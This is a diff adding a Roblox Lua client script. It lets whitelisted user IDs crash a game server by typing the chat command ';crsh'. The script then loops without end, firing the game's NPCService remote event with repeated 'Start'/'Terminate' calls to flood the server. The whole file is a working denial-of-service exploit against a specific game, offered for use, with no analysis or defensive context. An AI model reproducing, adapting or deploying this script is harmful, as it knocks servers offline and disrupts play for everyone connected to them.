@@ -1,0 +1,1068 @@
+local player = game.Players.LocalPlayer
+
+local ChatCommand = ";crsh"
+
+local Whitelists = {
+	"235792831", -- Wanwood1566243868757
+	"1296731549", -- Nurtz_TrUy
+	"1740373534", -- OctopusPzyy
+	"1813914793", --  hunchofrmiraq
+}
+
+function CrashServer()
+	for i = 1,math.huge do
+		if table.find(Whitelists, tostring(player.UserId)) then
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Start",
+				[2] = workspace.NPC.SaltySaloonNPC.NPCTag.Dialogue
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			local args = {
+				[1] = "Terminate"
+			}
+
+			game:GetService("ReplicatedStorage").Events.NPCService:FireServer(unpack(args))
+
+			wait(.1)
+		end
+	end    
+end 
+
+player.Chatted:Connect(function(chat)
+	local message = string.lower(chat)
+
+	if message == string.lower(ChatCommand) then
+		if table.find(Whitelists, tostring(player.UserId)) then
+			CrashServer()
+		end
+	end 
+end)
